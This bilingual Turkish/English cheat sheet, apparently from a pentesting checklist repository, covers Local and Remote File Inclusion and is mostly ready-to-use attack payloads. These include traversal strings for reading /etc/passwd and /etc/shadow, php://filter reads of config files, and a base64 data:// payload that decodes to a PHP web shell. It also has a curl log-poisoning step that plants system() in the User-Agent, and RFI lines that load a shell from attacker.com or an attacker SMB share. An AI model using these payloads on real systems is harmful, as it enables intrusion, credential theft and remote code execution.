# 📂 Local & Remote File Inclusion (LFI/RFI)

## 🇹🇷 Türkçe

### Kontrol Listesi

| # | Test | Açıklama | Durum |
|---|------|----------|-------|
| 1 | Basic LFI | `/etc/passwd` okuma | ⬜ |
| 2 | Path Traversal | `../` ile dizin atlama | ⬜ |
| 3 | Null Byte | `%00` ile uzantı bypass (Eski PHP) | ⬜ |
| 4 | PHP Wrappers | `php://filter`, `php://input` | ⬜ |
| 5 | RFI | Uzak sunucudan shell çağırma | ⬜ |
| 6 | Log Poisoning | Log dosyasına shell enjekte edip çağırma | ⬜ |

### LFI Payloadlar

**Linux:**
```
/etc/passwd
../../../../etc/passwd
../../../../etc/shadow
/proc/self/environ
/var/log/apache2/access.log
```

**Windows:**
```
C:\Windows\win.ini
..\..\..\..\Windows\win.ini
```

### PHP Wrappers (Çok Güçlü!)

**Base64 Encode (Kaynak Kodu Okuma):**
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
```
*(Dönen base64 string'i decode et)*

**RCE (allow_url_include=On ise):**
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
(decoded: <?php system($_GET['cmd']); ?>)
```

**Zip Wrapper (File Upload ile LFI):**
```
zip://shell.jpg%23payload.php
```

### Log Poisoning

1.  **User-Agent'a Shell Koy:**
    `curl -A "<?php system($_GET['cmd']); ?>" http://target.com/`
2.  **Log Dosyasını Çağır:**
    `http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id`

---

## 🇬🇧 English

### Checklist

| # | Test | Description | Status |
|---|------|-------------|--------|
| 1 | Basic LFI | Read system files | ⬜ |
| 2 | Path Traversal | Directory jumping | ⬜ |
| 3 | PHP Wrappers | Source code reading | ⬜ |
| 4 | RFI | Remote shell execution | ⬜ |
| 5 | Log Poisoning | RCE via logs | ⬜ |

### RFI Payloads

```
http://target.com/index.php?page=http://attacker.com/shell.txt
http://target.com/index.php?page=\\attacker_ip\share\shell.php (SMB)
```

### Tips

1.  **LFI to RCE:** Use log poisoning, `/proc/self/environ`, or PHP sessions.
2.  **Wrappers:** Always try `php://filter` to read source code first.

---

[← Back to README](../README.md)
